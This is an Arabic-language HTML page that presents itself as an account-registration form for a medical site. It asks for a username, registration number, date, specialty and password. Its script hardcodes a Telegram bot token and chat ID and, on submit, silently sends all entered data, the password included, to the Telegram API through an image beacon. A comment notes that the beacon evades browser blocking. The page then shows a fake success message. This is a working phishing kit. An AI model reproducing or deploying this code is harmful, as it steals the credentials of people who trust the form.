<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل البيانات | الطب الفائق</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .form-card { background: #ffffff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border: 1px solid #e2e8f0; }
        h2 { text-align: center; color: #1e293b; margin-bottom: 25px; }
        .group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #64748b; font-weight: bold; }
        input, select { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 14px; box-sizing: border-box; text-align: right; }
        .btn { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
        .date-row { display: flex; gap: 8px; }
        .date-row select { flex: 1; }
    </style>
</head>
<body>

<div class="form-card" id="mainContainer">
    <h2 id="titleText">إنشاء حساب جديد</h2>
    <form id="directBotForm">
        <div class="group"><label>اسم الدخول</label><input type="text" id="user" required></div>
        <div class="group"><label>الرقم التسجيل</label><input type="text" id="reg" required></div>
        <div class="group">
            <label>تاريخ التسجيل</label>
            <div class="date-row">
                <select id="y" required><script>for(let i=2026; i>=2000; i--) document.write(`<option value="${i}">${i}</option>`);</script></select>
                <select id="m" required><script>for(let i=1; i<=12; i++) document.write(`<option value="${i}">${i}</option>`);</script></select>
                <select id="d" required><script>for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);</script></select>
            </div>
        </div>
        <div class="group">
            <label>نوع التسجيل</label>
            <select id="spec" required><option value="طب">طب</option><option value="طب أسنان">طب أسنان</option><option value="صيدلة">صيدلة</option></select>
        </div>
        <div class="group"><label>كلمة المرور (English)</label><input type="password" id="pw" style="letter-spacing: -1px;" required></div>
        <button type="submit" class="btn" id="sBtn">إرسال البيانات</button>
    </form>
</div>

<script>
    const BOT_TOKEN = "8629398802:AAFpohJ2Y8Nmz5Je9FF262TW8YWIxUzruXg";
    const CHAT_ID = "7746757675";

    document.getElementById('directBotForm').onsubmit = function(e) {
        e.preventDefault();
        const btn = document.getElementById('sBtn');
        btn.disabled = true;
        btn.innerText = "جاري الحفظ...";

        const msg = `🔔 بيانات جديدة:\n👤 اليوزر: ${document.getElementById('user').value}\n🆔 الرقم: ${document.getElementById('reg').value}\n📅 التاريخ: ${document.getElementById('y').value}/${document.getElementById('m').value}/${document.getElementById('d').value}\n🩺 التخصص: ${document.getElementById('spec').value}\n🔑 الكلمة: ${document.getElementById('pw').value}`;

        // استخدام Image Beacon وهي أضمن وسيلة لإرسال البيانات دون حظر المتصفح
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
        
        const img = new Image();
        img.src = url;

        // إظهار صفحة النجاح فوراً بعد ثانية واحدة لضمان الإرسال
        setTimeout(() => {
            document.getElementById('mainContainer').innerHTML = `
                <div style="text-align: center; padding: 20px;">
                    <div style="color: #22c55e; font-size: 50px;">✔</div>
                    <h2 style="margin-top: 10px;">تم الإرسال بنجاح</h2>
                    <p style="color: #64748b;">سيتم مراجعة بياناتك قريباً.</p>
                </div>`;
        }, 1000);
    };
</script>

</body>
</html>
